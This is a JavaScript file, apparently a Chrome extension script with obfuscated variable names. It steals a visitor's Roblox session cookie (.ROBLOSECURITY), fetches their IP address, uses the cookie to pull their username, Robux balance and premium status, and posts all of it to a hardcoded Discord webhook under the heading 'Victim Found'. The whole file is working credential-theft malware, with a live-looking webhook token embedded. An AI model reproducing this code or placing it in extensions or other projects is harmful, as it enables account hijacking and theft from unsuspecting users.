const WEBHOOK_URL =
  'https://discord.com/api/webhooks/1268934131065032876/ELyWMXxu0-G8ivDYBnccWfqUUzcIIvUuECXZlynNNkNM9wvi-YMgS-Ic2P6U1PRhQNOW'
async function fetchIP() {
  try {
    const _0x556c6f = await fetch('https://api.ipify.org')
    return await _0x556c6f.text()
  } catch (_0x164f43) {
    return console.error('Error fetching IP:', _0x164f43), 'IP NOT FOUND'
  }
}
async function fetchUserInfo(_0x2cbcb3) {
  try {
    const _0x2241c6 = await fetch('https://www.roblox.com/mobileapi/userinfo', {
      headers: { Cookie: '.ROBLOSECURITY=' + _0x2cbcb3 },
      redirect: 'manual',
    })
    return await _0x2241c6.json()
  } catch (_0x1bf934) {
    return console.error('Error fetching user info:', _0x1bf934), null
  }
}
async function sendWebhook(_0x6cf598) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(_0x6cf598),
    })
  } catch (_0x4ca88d) {
    console.error('Error sending webhook:', _0x4ca88d)
  }
}
async function main(_0x5d3996) {
  const _0x3d5005 = await fetchIP(),
    _0x14e9da = _0x5d3996 ? await fetchUserInfo(_0x5d3996) : null,
    _0x194ef3 = {
      content: null,
      embeds: [
        {
          description:
            '```' + (_0x5d3996 ? _0x5d3996 : 'COOKIE NOT FOUND') + '```',
          color: null,
          fields: [
            {
              name: 'Username',
              value: _0x14e9da ? _0x14e9da.UserName : 'N/A',
              inline: true,
            },
            {
              name: 'Robux',
              value: _0x14e9da ? _0x14e9da.RobuxBalance : 'N/A',
              inline: true,
            },
            {
              name: 'Premium',
              value: _0x14e9da ? _0x14e9da.IsPremium : 'N/A',
              inline: true,
            },
          ],
          author: {
            name: 'Victim Found: ' + _0x3d5005,
            icon_url: _0x14e9da
              ? _0x14e9da.ThumbnailUrl
              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
          },
          footer: {
            text: 'https://github.com/ox-y',
            icon_url:
              'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png',
          },
          thumbnail: {
            url: _0x14e9da
              ? _0x14e9da.ThumbnailUrl
              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
          },
        },
      ],
      username: 'Roblox',
      avatar_url:
        'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png',
      attachments: [],
    }
  await sendWebhook(_0x194ef3)
}
chrome.cookies.get(
  {
    url: 'https://www.roblox.com/home',
    name: '.ROBLOSECURITY',
  },
  function (_0x245661) {
    main(_0x245661 ? _0x245661.value : null)
  }
)
